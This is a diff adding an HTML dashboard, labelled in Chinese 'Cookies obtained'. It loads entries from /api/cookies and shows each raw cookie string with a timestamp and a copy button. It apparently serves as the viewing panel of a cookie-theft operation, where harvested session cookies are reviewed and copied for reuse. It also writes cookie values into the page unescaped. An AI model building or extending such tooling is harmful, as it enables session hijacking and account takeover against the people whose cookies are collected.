@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie列表</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#fff;font-family:Arial;padding:20px}
+h2{color:#ff4900;margin-bottom:20px}
+.item{background:#1a1a1a;padding:14px;margin-bottom:12px;border-radius:10px;border-left:3px solid #ff4900}
+.item .t{font-size:12px;color:#666;margin-bottom:6px}
+.item .cookie{font-size:12px;color:#ccc;word-break:break-all;line-height:1.6}
+.item button{margin-top:8px;padding:6px 14px;background:#ff4900;color:#fff;border:none;border-radius:4px;font-size:12px;cursor:pointer}
+.refresh{position:fixed;top:16px;right:16px;padding:8px 16px;background:#ff4900;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
+</style>
+</head>
+<body>
+<h2>已获取的Cookie</h2>
+<button class="refresh" onclick="load()">刷新</button>
+<div id="list">加载中...</div>
+
+<script>
+async function load() {
+    const res = await fetch("/api/cookies");
+    const data = await res.json();
+    document.getElementById("list").innerHTML = data.length === 0 
+        ? "<p style='color:#666'>暂无数据</p>"
+        : data.map(c => `
+            <div class="item">
+                <div class="t">${new Date(c.time).toLocaleString()}</div>
+                <div class="cookie">${c.cookie}</div>
+                <button onclick="copyText('${c.cookie.replace(/'/g, "\\'").replace(/</g, "&lt;")}')">复制</button>
+            </div>
+        `).join("");
+}
+
+function copyText(text) {
+    navigator.clipboard.writeText(text).then(() => alert("已复制"));
+}
+
+load();
+</script>
+</body>
+</html>
